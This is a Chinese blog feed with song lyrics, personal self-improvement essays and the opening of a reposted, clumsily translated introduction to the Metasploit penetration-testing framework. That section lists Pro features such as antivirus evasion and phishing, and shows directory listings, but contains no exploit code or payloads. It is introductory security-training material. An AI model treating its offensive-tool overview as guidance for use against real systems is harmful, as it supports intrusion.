    <content type="html"><![CDATA[<blockquote><p>歌曲来源：<a href="https://music.163.com/#/song?id=1353975561">https://music.163.com/#/song?id=1353975561</a><br>歌手：白黎 &#x2F; 楼一辰 &#x2F; 长渊 &#x2F; 崖雎 &#x2F; 墨辰Aaron<br>所属专辑：咏侠 【楚留香 侠客行 月载此情四合院战歌】</p></blockquote><p>为止魍魉祸天下 众士提剑挂甲<br>紧戎装怒马 疾驰万里飞沙<br>震剑搏生杀 战火遥映云霞<br>力挽 乾坤 还山河如画</p><p>月华流转玉虚宫 敛我孤影茕茕<br>明眸映苍穹 见雪方知隆冬<br>天地浩然淙 赴战亦当从容<br>赖于 此地 岂能称英雄</p><p>枯木逢春霞 再度生花<br>帐里 醉卧听琵琶 煮酒茶<br>稻香满酒家 便是繁华<br>愿世人 岁岁话桑麻</p><p>情莫测 深浅难辨 朵朵含羞浓艳<br>累叠成千万 错综红尘纠缠<br>美酒美人宴 吾之初心不变<br>人活 风流 世间</p><p>载我剑者乃春风 升云海见星穹<br>酒香出陈瓮 邀那明月与共<br>同暮鼓晨钟 今夜并入肠中<br>游哉 快哉 御剑势如虹</p><p>尘寰几度，知念念无相<br>妄见止息，听山河说赠<br>把酒凌云，酌兰亭共月<br>万古来者<br>三千过客<br>百载，快平生</p><p>为侠 江湖飘逸潇洒<br>却是免不了争杀<br>独步 行于天涯<br>便应了却牵挂</p><p>此世间碎语闲话 多如北漠黄沙<br>梦里败了花 空让美景折煞<br>缘难辨真假 不妨暂且放下<br>君临 天下 千夫血作画</p><p>(合：)<br>此生 不悔 舍身为豪侠</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;歌曲来源：&lt;a href=&quot;https://music.163.com/#/song?id=1353975561&quot;&gt;https://music.163.com/#/song?id=1353975561&lt;/a&gt;&lt;br&gt;歌手：白黎 &amp;#x2F; 楼一辰</summary>
      
    
    
    
    <category term="歌曲推荐" scheme="http://touristdaughter.cyou/categories/%E6%AD%8C%E6%9B%B2%E6%8E%A8%E8%8D%90/"/>
    
    
  </entry>
  
  <entry>
    <title>文章标题：漫步时光——我的悠然自得与精进之路</title>
    <link href="http://touristdaughter.cyou/2025/04/02/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%EF%BC%9A%E6%BC%AB%E6%AD%A5%E6%97%B6%E5%85%89%E2%80%94%E2%80%94%E6%88%91%E7%9A%84%E6%82%A0%E7%84%B6%E8%87%AA%E5%BE%97%E4%B8%8E%E7%B2%BE%E8%BF%9B%E4%B9%8B%E8%B7%AF/"/>
    <id>http://touristdaughter.cyou/2025/04/02/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%EF%BC%9A%E6%BC%AB%E6%AD%A5%E6%97%B6%E5%85%89%E2%80%94%E2%80%94%E6%88%91%E7%9A%84%E6%82%A0%E7%84%B6%E8%87%AA%E5%BE%97%E4%B8%8E%E7%B2%BE%E8%BF%9B%E4%B9%8B%E8%B7%AF/</id>
    <published>2025-04-02T11:59:56.561Z</published>
    <updated>2025-04-02T12:09:55.350Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文章标题：漫步时光——我的悠然自得与精进之路"><a href="#文章标题：漫步时光——我的悠然自得与精进之路" class="headerlink" title="文章标题：漫步时光——我的悠然自得与精进之路"></a>文章标题：漫步时光——我的悠然自得与精进之路</h1><p> <br>作者：杜卿云 </p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> <br>生活是一场漫长的旅程，我们都是漫步其中的旅人。在这场旅程中，我学会了如何在悠然自得中追求精进，如何在从容不迫中实现自我成长。这篇文章，我想与大家分享我的漫步时光，希望我的故事能带给你一些启发和宁静。 </p><h2 id="一、悠然自得的哲学"><a href="#一、悠然自得的哲学" class="headerlink" title="一、悠然自得的哲学"></a>一、悠然自得的哲学</h2><p> </p><h3 id="1-享受过程"><a href="#1-享受过程" class="headerlink" title="1.享受过程"></a>1.享受过程</h3><p> <br>在追求梦想的过程中，我逐渐领悟到，享受过程比追求结果更为重要。每一个努力的瞬间，都是生命中最美的风景。<br>生活不是一场竞赛，而是一场旅行。我们不必急于到达终点，而是要学会欣赏沿途的风景。 </p><h3 id="2-保持平衡"><a href="#2-保持平衡" class="headerlink" title="2.保持平衡"></a>2.保持平衡</h3><p> <br>在学习和生活中，我努力保持一种平衡。工作与休闲，紧张与放松，都是我生活中不可或缺的部分。<br>平衡是生活的艺术。只有在平衡中，我们才能找到真正的宁静和满足。 </p><h3 id="3-拥抱变化"><a href="#3-拥抱变化" class="headerlink" title="3.拥抱变化"></a>3.拥抱变化</h3><p> <br>世界在不断变化，我学会了拥抱变化，将其视为生活的一部分。每一次变化，都是一次成长的机会。<br>变化是生活的常态。只有拥抱变化，我们才能在不断变化的世界中保持活力和竞争力。 </p><h2 id="二、精进的艺术"><a href="#二、精进的艺术" class="headerlink" title="二、精进的艺术"></a>二、精进的艺术</h2><p> </p><h3 id="1-持续学习"><a href="#1-持续学习" class="headerlink" title="1.持续学习"></a>1.持续学习</h3><p> <br>学习是一生的旅程，我始终保持对知识的渴望。无论是数学、编程还是其他领域，我都乐于探索和学习。<br>学习是精进的基石。只有不断学习，我们才能在快速变化的世界中立于不败之地。 </p><h3 id="2-设定目标"><a href="#2-设定目标" class="headerlink" title="2.设定目标"></a>2.设定目标</h3><p> <br>在每一个阶段，我都会设定明确的目标。这些目标不仅是我前进的动力，也是我衡量自己进步的标准。<br>目标是前进的灯塔。只有明确目标，我们才能在追梦路上不断前行。 </p><h3 id="3-反思与总结"><a href="#3-反思与总结" class="headerlink" title="3.反思与总结"></a>3.反思与总结</h3><p> <br>定期反思和总结是我生活中的一部分。通过反思，我能够更好地认识自己，发现不足，并制定改进计划。<br>反思是成长的催化剂。只有不断反思，我们才能在自我提升的道路上不断进步。 </p><h2 id="三、悠然自得与精进的结合"><a href="#三、悠然自得与精进的结合" class="headerlink" title="三、悠然自得与精进的结合"></a>三、悠然自得与精进的结合</h2><p> </p><h3 id="1-悠然中的精进"><a href="#1-悠然中的精进" class="headerlink" title="1.悠然中的精进"></a>1.悠然中的精进</h3><p> <br>在悠然自得的生活中，我始终保持精进的态度。无论是学习新知识还是提升技能，我都力求做到最好。<br>悠然自得与精进并不矛盾。只有在悠然中精进，我们才能在生活中找到真正的平衡和满足。 </p><h3 id="2-精进中的悠然"><a href="#2-精进中的悠然" class="headerlink" title="2.精进中的悠然"></a>2.精进中的悠然</h3><p> <br>在追求精进的过程中，我学会了放松和享受。每一次努力和进步，都是我生活中的一部分，而不是全部。<br>精进中的悠然，是一种生活智慧。只有在精进中保持悠然，我们才能在追梦路上找到真正的快乐和宁静。 </p><h2 id="四、漫步时光的感悟"><a href="#四、漫步时光的感悟" class="headerlink" title="四、漫步时光的感悟"></a>四、漫步时光的感悟</h2><p> </p><h3 id="1-珍惜当下"><a href="#1-珍惜当下" class="headerlink" title="1.珍惜当下"></a>1.珍惜当下</h3><p> <br>在漫步时光的过程中，我学会了珍惜当下。每一个瞬间，都是生命中最美的时刻。<br>珍惜当下，是生活最美的姿态。只有珍惜每一个瞬间，我们才能在生活中找到真正的幸福。 </p><h3 id="2-追求内心平静"><a href="#2-追求内心平静" class="headerlink" title="2.追求内心平静"></a>2.追求内心平静</h3><p> <br>在忙碌的生活中，我努力追求内心的平静。通过冥想、阅读和写作，我找到了内心的宁静。<br>内心平静，是生活最高的境界。只有在平静中，我们才能找到真正的自我和生活的意义。 </p><h3 id="3-分享与传递"><a href="#3-分享与传递" class="headerlink" title="3.分享与传递"></a>3.分享与传递</h3><p> <br>在追梦的过程中，我得到了许多人的帮助和支持。我希望通过分享我的经验和心得，能够回馈社会，帮助更多的人。<br>分享与传递，是实现自我价值的重要途径。只有通过分享，我们才能在生活中找到真正的意义和满足。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文章标题：漫步时光——我的悠然自得与精进之路&quot;&gt;&lt;a href=&quot;#文章标题：漫步时光——我的悠然自得与精进之路&quot; class=&quot;headerlink&quot; title=&quot;文章标题：漫步时光——我的悠然自得与精进之路&quot;&gt;&lt;/a&gt;文章标题：漫步时光——我的悠然自得与精进</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>文章标题：理解与成长——与父母和解，走向优雅的自己</title>
    <link href="http://touristdaughter.cyou/2025/03/27/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%EF%BC%9A%E7%90%86%E8%A7%A3%E4%B8%8E%E6%88%90%E9%95%BF%E2%80%94%E2%80%94%E4%B8%8E%E7%88%B6%E6%AF%8D%E5%92%8C%E8%A7%A3%EF%BC%8C%E8%B5%B0%E5%90%91%E4%BC%98%E9%9B%85%E7%9A%84%E8%87%AA%E5%B7%B1/"/>
    <id>http://touristdaughter.cyou/2025/03/27/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%EF%BC%9A%E7%90%86%E8%A7%A3%E4%B8%8E%E6%88%90%E9%95%BF%E2%80%94%E2%80%94%E4%B8%8E%E7%88%B6%E6%AF%8D%E5%92%8C%E8%A7%A3%EF%BC%8C%E8%B5%B0%E5%90%91%E4%BC%98%E9%9B%85%E7%9A%84%E8%87%AA%E5%B7%B1/</id>
    <published>2025-03-27T09:07:11.487Z</published>
    <updated>2025-04-01T10:52:50.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文章标题：理解与成长——与父母和解，走向优雅的自己"><a href="#文章标题：理解与成长——与父母和解，走向优雅的自己" class="headerlink" title="文章标题：理解与成长——与父母和解，走向优雅的自己"></a>文章标题：理解与成长——与父母和解，走向优雅的自己</h1><p> <br>作者：杜卿云   </p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在当今社会，许多大学生毕业后步入职场，开始独立生活，这时他们可能会对父母产生一种新的认知：有些人会觉得父母的行为和态度令人难以接受，甚至有人极端地想要与父母断绝关系。这种现象背后隐藏着怎样的原因？我们又该如何面对和处理这种复杂的情感？ </p><h2 id="一、理解父母的成长背景"><a href="#一、理解父母的成长背景" class="headerlink" title="一、理解父母的成长背景"></a>一、理解父母的成长背景</h2><p>首先，我们需要理解父母那一代人（此处以70后为例阐述）成长的环境。绝大多数父母（不包括少数人）出生在一个物质匮乏、教育机会稀缺的时代。他们从小生活艰苦，没有机会接受高等教育，这使得他们有时候在言行上可能显得天生没素质、粗鄙、戏谑过分、没礼貌、不懂得尊重别人。<br>这种行为并不是他们的本意，而是时代和环境造成的局限。他们在艰苦的条件下努力生存，养育我们，已经尽了他们最大的努力。我们不能以现代社会的标准去苛求他们，因为他们没有我们今天所拥有的资源和机会。 </p><h2 id="二、换位思考，感恩父母"><a href="#二、换位思考，感恩父母" class="headerlink" title="二、换位思考，感恩父母"></a>二、换位思考，感恩父母</h2><p>面对父母的不足，我们应当学会换位思考，理解他们的成长背景和局限性。想象一下，如果我们出生在他们的时代，面对同样的环境和条件，我们是否能够做得更好？<br>感恩是一种美德，也是我们与父母和解的关键。父母给了我们生命，养育我们长大，他们的爱是无私的。我们应当感恩他们的付出，而不是一味地指责和抱怨。<br>如何感恩？<br> <br>倾听与沟通：多与父母交流，倾听他们的故事和心声，增进彼此的理解。<br>尊重与包容：尊重他们的生活方式和习惯，包容他们的不足，用我们的行动去影响和改变他们。<br>关爱与陪伴：多花时间陪伴父母，给予他们关爱和温暖，让他们感受到我们的心意。 </p><h2 id="三、追求自我成长，变得更优秀"><a href="#三、追求自我成长，变得更优秀" class="headerlink" title="三、追求自我成长，变得更优秀"></a>三、追求自我成长，变得更优秀</h2><p>在理解父母的同时，我们也要追求自我成长，变得更优秀。与其抱怨父母的不足，不如向优秀的同龄人学习，提升自己的素质和修养。<br>如何变得更优秀？<br> <br>学习与提升：不断学习新知识，提升自己的专业能力和综合素质。<br>模仿与超越：向优秀的同龄人学习，模仿他们的优点和长处，同时也要超越他们，形成自己的独特风格。<br>自律与坚持：保持自律，坚持良好的生活习惯和积极的心态，不断挑战自我，突破自我。<br> <br>优雅的生活态度：<br>优雅不仅仅体现在外在的举止和言谈上，更体现在内心的修养和智慧中。我们要以优雅的态度面对生活，不被父母的不足所影响，而是通过自己的努力，成为一个更好的人。 </p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>理解父母，感恩他们的付出，是我们与父母和解的第一步。同时，我们也要追求自我成长，变得更优秀，变得更优雅。通过换位思考和自我提升，我们不仅能够改善与父母的关系，还能够成为更好的自己，过上更加幸福和充实的生活。<br>让我们以感恩和成长的心态，面对生活中的每一个挑战，成为一个不仅优秀而且优雅的人。 </p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>希望这篇文章能够引发大家的思考，让我们共同努力，创造一个更加和谐美好的家庭和社会环境。</p><p>杜卿云<br>2025年3月</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文章标题：理解与成长——与父母和解，走向优雅的自己&quot;&gt;&lt;a href=&quot;#文章标题：理解与成长——与父母和解，走向优雅的自己&quot; class=&quot;headerlink&quot; title=&quot;文章标题：理解与成长——与父母和解，走向优雅的自己&quot;&gt;&lt;/a&gt;文章标题：理解与成长—</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>行业特征与个人形象：影响后代的无形遗产</title>
    <link href="http://touristdaughter.cyou/2024/06/03/%E8%A1%8C%E4%B8%9A%E7%89%B9%E5%BE%81%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BD%A2%E8%B1%A1%EF%BC%9A%E5%BD%B1%E5%93%8D%E5%90%8E%E4%BB%A3%E7%9A%84%E6%97%A0%E5%BD%A2%E9%81%97%E4%BA%A7/"/>
    <id>http://touristdaughter.cyou/2024/06/03/%E8%A1%8C%E4%B8%9A%E7%89%B9%E5%BE%81%E4%B8%8E%E4%B8%AA%E4%BA%BA%E5%BD%A2%E8%B1%A1%EF%BC%9A%E5%BD%B1%E5%93%8D%E5%90%8E%E4%BB%A3%E7%9A%84%E6%97%A0%E5%BD%A2%E9%81%97%E4%BA%A7/</id>
    <published>2024-06-03T14:39:51.505Z</published>
    <updated>2024-06-03T14:51:09.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="行业特征与个人形象：影响后代的无形遗产"><a href="#行业特征与个人形象：影响后代的无形遗产" class="headerlink" title="行业特征与个人形象：影响后代的无形遗产"></a>行业特征与个人形象：影响后代的无形遗产</h1><p>在历史的长河中，我们不难发现，同一行业中的人们往往具有类似的特征，无论是生活习惯、思维模式、行为模式，还是长相。这种现象不仅在古代有所体现，在现代社会中也同样存在。例如，在互联网领域取得成就的人，往往拥有高颜值和高智感。这种特征的相似性，无疑影响了后人对该行业的认知和选择。</p><p>首先，我们生活的每一个细节都至关重要。我们需要认真挑选自己使用的物品，认真做好自己的事情，确保自己的行为、长相和穿搭符合我们理想目标的模式。例如，如果我们的目标是成为一名白领，那么我们就应该穿着职场化，并付出相应的努力。这种看似微不足道的行为，实际上在潜移默化中影响了我们的形象，也影响了后人的选择。</p><p>其次，我们的形象和成就不仅关乎自己，更关乎我们的后代。我们的行为和努力，会在无意中成为后代参考的模板。如果我们希望他们能够走向成功的道路，那么我们就必须以身作则，努力做到最好。正如古代典故中所言，“龙生龙，凤生凤”，我们的形象和成就，将会成为后代选择行业的无形遗产。为了后代，我们更要认真对待自己的事情，努力做到最好。这是因为，我们的后代会根据我们的成绩、形象和职业来判断自己的发展方向。例如，如果某位条件与我们极其相似的后辈发现我们是一位成功的企业家，他们可能会受到启发，立志成为优秀的企业家。这种刻板印象虽然有时会限制个体的多元化发展，但在很大程度上也起到了传承和激励的作用。</p><p>在我国古代，有许多典故都传达了这一观点。诸如“孟母三迁”的故事，孟母为了让儿子孟子成为一个有道德、有文化的人，不惜三次搬家，最终使孟子在良好的环境下成长为一个杰出的思想家。又如“岳飞背刺字”，岳母在岳飞背上刺下“精忠报国”的字样，激发了他为国家效忠奋斗的勇气和决心。这些典故都说明了我们的长辈为了后代的发展，会尽全力为他们创造一个良好的环境，树立榜样，使我们能够传承他们的优秀品质。</p><p>最后，我们应当忽略他人的评价，坚定地做好自己的事情。因为我们的每一个细节，都可能在无形中影响后代的决策。如果我们希望他们能够拥有更好的未来，那么我们就必须用自己的行动，为他们树立一个榜样。</p><p>总之，我们应当认识到，行业特征和个人形象之间的关联，以及这种关联对后代的影响。只有通过努力做好自己，才能为后代留下一个更好的未来。在这个过程中，我们不仅是在塑造自己的命运，更是在塑造后代的未来。因此，让我们怀着责任感和使命感，认真对待自己的事情，为后代创造一个更加美好的世界。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;行业特征与个人形象：影响后代的无形遗产&quot;&gt;&lt;a href=&quot;#行业特征与个人形象：影响后代的无形遗产&quot; class=&quot;headerlink&quot; title=&quot;行业特征与个人形象：影响后代的无形遗产&quot;&gt;&lt;/a&gt;行业特征与个人形象：影响后代的无形遗产&lt;/h1&gt;&lt;p&gt;在历</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>使用METASPLOIT框架</title>
    <link href="http://touristdaughter.cyou/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/"/>
    <id>http://touristdaughter.cyou/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/</id>
    <published>2024-05-06T08:34:31.642Z</published>
    <updated>2025-04-04T04:08:10.230Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Author: Answer_77<br>本文来源：<a href="https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/">https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具最近在安全行业的社交媒体圈内引起了激烈的争论。一些讨论围绕某些群体的个人偏好展开，而另一些则旨在评估向公众公开工具的政策。然而，有必要指出自动化工具在当今行业中的重要性。</p><p>我们确实听到或将要听到的普遍意见是，在安全评估期间使用自动化工具不是正确的选择。这是因为在与易受攻击的环境交互时，它们无法为安全分析师或渗透测试人员提供“证明”自己的机会。此外，许多人表示，工具使审核员的工作变得过于简单，以至于他们的评估无法获得任何认可。</p><p>另一个声音团体不同意 - 那些由信息安全社区的新成员组成的，他们刚刚开始并迈出他们的第一步，以及那些坚持认为工具通过为我们提供对过多的用户更友好的方法来帮助我们更好地学习的论点存在于野外的漏洞，同时为我们节省了评估更复杂部分的时间。我们也将采取这种对抗性的方式来处理这个问题。</p><p>在某些情况下，工具确实会给我们带来一些缺点：</p><ul><li>创建一个难以突破的舒适区来学习新技能</li><li>仅仅因为它们在线发布供所有人查看和使用而造成安全风险</li><li>营造隧道视觉效果。<code>If the tool cannot do it, neither can I.</code></li></ul><p>​就像在工作的创造性部分可以与自动化任务相结合的其他行业一样，工具可以限制我们作为新用户的观点和行动。我们可能错误地认为<code>learn</code>它们提供了所有问题的解决方案，我们开始越来越依赖它们。反过来，这会产生一种隧道视觉效果，这种效果可以而且将会限制用户可能会考虑并采取行动进行评估的可能交互。</p><p>​与此同时，越来越多的这些自动化工具进入公共部门（参见美国国家安全局向公众发布安全工具）这一事实为几乎不了解这些工具的潜在恶意行为者创造了更多可能性行业根据他们快速获利的愿望采取行动，或者在充满小人物的黑暗房间里炫耀他们的努力。</p><h2 id="纪律"><a href="#纪律" class="headerlink" title="纪律"></a>纪律</h2><p>如果要从信息安全行业的当前状态中得出任何有辨识力的因素，则必须在我们处于现有技术、协议和系统的持续、加速演进的前提下得出这些因素。由于我们在评估期间遇到大量环境变量，因此必须尽可能节省时间，并为审核员形成强大的安全范例。纪律在所有工作领域都至关重要，结论如下：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>我们将永远没有足够的时间来完成评估。由于在每一种环境变化中使用的技术数量众多，我们将没有时间进行完整、全面的评估。时间就是金钱，我们为不懂技术的客户加班加点，我们需要先完成大部分工作：最具潜在影响和修复周转率最高的问题。</td></tr><tr><td>即使我们制作工具或手动利用每项服务，可信度也可能成为问题。我们不是与其他行业成员竞争，而是与客户管理层预先设定的经济条件和个人信念竞争。他们不会理解或非常重视荣誉。他们只希望在最短的时间内完成尽可能多的工作。</td></tr><tr><td>您只需要打动自己，而不是信息安全社区。如果我们做到了前者，后者自然会到来。使用与上述相同的示例，许多在线存在的艺术家在追求在线验证时偏离了最初的目标。他们的艺术对于敏锐的眼睛来说变得陈旧和普通，但对于日常用户来说，它包含了他们想要的视觉元素和主题，而不是那些他们的追随者还不知道他们想要的。作为安全研究人员或渗透测试人员，我们只需要验证漏洞，而不是验证我们的自我。</td></tr></tbody></table><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们必须从内到外分析和了解我们的工具，以保持我们的踪迹并避免在评估期间发生灾难性事件。许多工具可以证明是不可预测的。有些可能会在目标系统上留下活动痕迹，有些可能会让我们的攻击者平台敞开大门。尽管如此，只要我们遵守此处的规则，它们就可以成为初学者的宝贵教育平台，以及专业人士所需的节省时间的机制。</p><p>不要有隧道视野。将该工具用作工具，而不是我们完整评估的支柱或生命支持。</p><p>请阅读您可以找到的有关我们任何工具的所有技术文档。请深入了解他们。千方百计（或函数或类）。这将帮助我们避免意外行为或愤怒的客户和律师团队。</p><p>假设我们审核我们的工具并为自己设置一个可靠的方法来进行初步检查和攻击路径。在这种情况下，工具将为我们节省进一步研究和对我们的安全研究范式进行长期具体探索的时间。考虑到越来越多的技术出现在当今环境中的速度越来越快，这项进一步的研究应该侧重于对安全机制的更深入理解，进一步对更抽象的安全对象进行审计，以扩大分析范围。这就是我们作为专业人士的发展方式。</p><h1 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h1><p>​这<code>Metasploit Project</code>是一个基于 Ruby 的模块化渗透测试平台，使您能够编写、测试和执行漏洞利用代码。该漏洞利用代码可以由用户定制，也可以从包含已发现的最新模块化漏洞利用的数据库中获取。其中<code>Metasploit Framework</code>包括一套工具，可用于测试安全漏洞、枚举网络、执行攻击和逃避检测。其核心<code>Metasploit Project</code>是一组常用工具，为渗透测试和漏洞利用开发提供了完整的环境。</p><p><img src="/img/METASPLOIT1.png"></p><p>​提到<code>modules</code>的是实际的漏洞利用概念验证，已经在野外开发和测试并集成在框架内，以便渗透测试人员可以轻松访问针对不同平台和服务的不同攻击向量。Metasploit 不是万事通，而是一把瑞士军刀，其工具足以帮助我们解决最常见的未修补漏洞。</p><p>​它的强项在于它提供了大量可用的目标和版本，所有这些都离成功的立足点很远。这些，结合为那些易受攻击的版本量身定制的漏洞利用以及在漏洞利用后发送的有效负载，这将使我们能够实际访问系统，为我们提供了一种简单、自动化的方式来在我们的帖子期间在目标连接之间切换- 开发企业。</p><h2 id="Metasploit-Pro"><a href="#Metasploit-Pro" class="headerlink" title="Metasploit Pro"></a>Metasploit Pro</h2><p><code>Metasploit</code>作为一个产品分为两个版本。该<code>Metasploit Pro</code>版本与具有一些附加功能的版本不同<code>Metasploit Framework</code>：</p><ul><li>任务链</li><li>社会工程学</li><li>漏洞验证</li><li>图形用户界面</li><li>快速启动向导</li><li>集成</li></ul><p>如果您更喜欢命令行用户并且更喜欢额外的功能，那么专业版还包含自己的控制台，就像<code>msfconsole</code>.</p><p>要大致了解 Metasploit Pro 的最新功能可以实现什么，请查看以下列表：</p><table><thead><tr><th><strong>浸润</strong></th><th><strong>收集数据</strong></th><th><strong>修复</strong></th></tr></thead><tbody><tr><td>手动开发</td><td>导入和扫描数据</td><td>暴力破解</td></tr><tr><td>防病毒规避</td><td>发现扫描</td><td>任务链</td></tr><tr><td>IPS&#x2F;IDS规避</td><td>元模块</td><td>开发工作流程</td></tr><tr><td>代理枢轴</td><td>Nexpose 扫描集成</td><td>会话重新运行</td></tr><tr><td>开发后</td><td></td><td>任务回放</td></tr><tr><td>会话清理</td><td></td><td>项目声纳集成</td></tr><tr><td>凭据重用</td><td></td><td>会话管理</td></tr><tr><td>社会工程学</td><td></td><td>凭证管理</td></tr><tr><td>有效载荷生成器</td><td></td><td>团队协作</td></tr><tr><td>快速渗透测试</td><td></td><td>网络界面</td></tr><tr><td>VPN 枢轴</td><td></td><td>备份还原</td></tr><tr><td>漏洞验证</td><td></td><td>数据导出</td></tr><tr><td>网络钓鱼向导</td><td></td><td>证据收集</td></tr><tr><td>网络应用测试</td><td></td><td>报告</td></tr><tr><td>持久会话</td><td></td><td>标记数据</td></tr></tbody></table><h2 id="Metasploit-框架控制台"><a href="#Metasploit-框架控制台" class="headerlink" title="Metasploit 框架控制台"></a>Metasploit 框架控制台</h2><p>可能<code>msfconsole</code>是最流行的<code>Metasploit Framework</code> <code>(MSF)</code>. 它提供了一个“一体式”集中式控制台，并允许您高效地访问<code>MSF</code>. <code>Msfconsole</code>一开始可能看起来很吓人，但是一旦您了解了命令的语法，您就会学会欣赏使用此界面的强大功能。</p><p>一般带来的功能<code>msfconsole</code>有以下几点：</p><ul><li>这是访问其中大部分功能的唯一受支持的方式<code>Metasploit</code></li><li>提供基于控制台的界面<code>Framework</code></li><li>包含最多的功能，是最稳定的<code>MSF</code>界面</li><li>完整的 readline 支持、制表符和命令完成</li><li>执行外部命令<code>msfconsole</code></li></ul><p>上述两种产品都带有一个广泛的可用模块数据库，可用于我们的评估。这些与外部命令（如扫描器、社会工程工具包和有效负载生成器）的使用相结合，可以将我们的设置变成一个随时可用的机器，使我们能够通过使用无缝地控制和操纵野外的不同漏洞会话和作业的方式与我们在 Internet 浏览器上看到选项卡的方式相同。</p><p>这里的关键术语是可用性——用户体验。我们可以轻松控制控制台可以改善我们的学习体验。因此，让我们深入研究细节。</p><h2 id="了解架构"><a href="#了解架构" class="headerlink" title="了解架构"></a>了解架构</h2><p>要完全操作我们正在使用的任何工具，我们必须首先了解它的内部结构。这是一种很好的做法，它可以让我们更好地了解当该工具发挥作用时我们的安全评估过程中会发生什么。重要的是不要使用<a href="https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/">任何可能使您或您的客户面临数据泄露风险的通配符</a>。</p><p><code>/usr/share/metasploit-framework</code>默认情况下，所有与 Metasploit Framework 相关的基础文件都可以在我们的发行版中找到<code>ParrotOS Security</code>。</p><h4 id="数据、文档、库"><a href="#数据、文档、库" class="headerlink" title="数据、文档、库"></a>数据、文档、库</h4><p>这些是框架的基础文件。Data 和 Lib 是 msfconsole 界面的功能部分，而 Documentation 文件夹包含有关该项目的所有技术细节。</p><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>上面详述的模块在此文件夹中分为不同的类别。我们将在下一节中详细介绍这些内容。它们包含在以下文件夹中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules</span><br><span class="line"></span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure><h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>插件在使用时为渗透测试人员提供了更大的灵活性，<code>msfconsole</code>因为它们可以根据需要轻松地手动或自动加载，以在我们的评估期间提供额外的功能和自动化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb</span><br><span class="line">alias.rb           komand.rb      pcap_log.rb          sqlmap.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           thread.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br></pre></td></tr></table></figure><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>Meterpreter 功能和其他有用的脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/</span><br><span class="line"></span><br><span class="line">meterpreter  ps  resource  shell</span><br></pre></td></tr></table></figure><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>可以直接从菜单调用的命令行实用程序<code>msfconsole</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 